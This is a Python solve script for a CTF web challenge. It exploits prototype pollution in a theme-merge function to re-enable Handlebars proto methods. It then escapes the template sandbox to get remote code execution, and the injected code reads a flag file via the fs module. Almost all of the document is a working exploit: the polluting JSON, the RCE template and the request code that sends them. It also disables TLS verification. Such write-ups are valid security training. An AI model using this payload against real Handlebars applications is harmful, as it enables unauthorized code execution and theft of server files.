#!/usr/bin/env python3
"""
FortID CTF 2026 - web/do-you-know-lika : Handlebars sandbox escape -> RCE -> flag.

The worker merges the attacker-supplied `theme` into a fresh object with
`mergeTheme()` (recursive, no `__proto__` guard on `constructor.prototype`), so
a theme of

    {"constructor": {"prototype": {"allowedProtoMethods": {"constructor": true, ...}}}}

sets `Object.prototype.allowedProtoMethods` before rendering. Handlebars'
`createProtoAccessControl(options)` reads `options.allowedProtoMethods` (now
inherited from Object.prototype!) and copies its entries into the proto-access
method whitelist, un-blocking `constructor`, `apply`, `push`, `pop`.

That restores the classic Handlebars RCE:
  * `theme.constructor.constructor`            -> Function
  * push it into a model array, then `#each`   -> context is the Function ctor
  * `(theme.constructor.constructor.apply 0 code)` -> Function(...code)
  * `{{#with ...}}` lambda-calls the returned function -> code runs
The worker runs with `--allow-fs-read=/tmp/lika/flag.txt`, so
`process.getBuiltinModule('fs').readFileSync(process.env.FLAG_PATH)` succeeds.

Usage:
  ./solve.py <host> [port]
  CHAL_HOST=... CHAL_PORT=... ./solve.py
"""
import json
import os
import re
import ssl
import sys
import urllib.request

RCE = ("return process.getBuiltinModule('fs')"
       ".readFileSync(process.env.FLAG_PATH,'utf8')")

TEMPLATE = (
    "{{#with arr}}"
    "{{this.pop}}"
    "{{this.push @root.theme.constructor.constructor}}"
    "{{this.pop}}"
    "{{#each this}}"
    "{{#with (@root.theme.constructor.constructor.apply 0 @root.code)}}{{this}}{{/with}}"
    "{{/each}}"
    "{{/with}}"
)

THEME = {
    "constructor": {
        "prototype": {
            "allowedProtoMethods": {
                "constructor": True,
                "apply": True,
                "push": True,
                "pop": True,
            }
        }
    }
}

MODEL = {"arr": [1], "code": [RCE]}


def fetch_flag(host: str, port: int = 443, timeout: int = 30) -> str:
    scheme = "https" if port == 443 else "http"
    url = f"{scheme}://{host}:{port}/api/preview"
    job = json.dumps({"template": TEMPLATE, "theme": THEME, "model": MODEL}).encode()
    req = urllib.request.Request(url, data=job, headers={"Content-Type": "application/json"})
    ctx = ssl._create_unverified_context()
    body = urllib.request.urlopen(req, context=ctx, timeout=timeout).read().decode()
    data = json.loads(body)
    output = data.get("output", "") if data.get("ok") else data.get("error", "")
    match = re.search(r"FortID\{[^}]*\}", output)
    if not match:
        raise SystemExit("no flag in response: %s" % body[:400])
    return match.group(0)


def main() -> None:
    args = [a for a in sys.argv[1:] if not a.startswith("-")]
    host = args[0] if args else os.environ.get("CHAL_HOST", "")
    port = int(args[1] if len(args) > 1 else os.environ.get("CHAL_PORT", "443"))
    if not host:
        raise SystemExit(__doc__)
    print(fetch_flag(host, port))


if __name__ == "__main__":
    main()
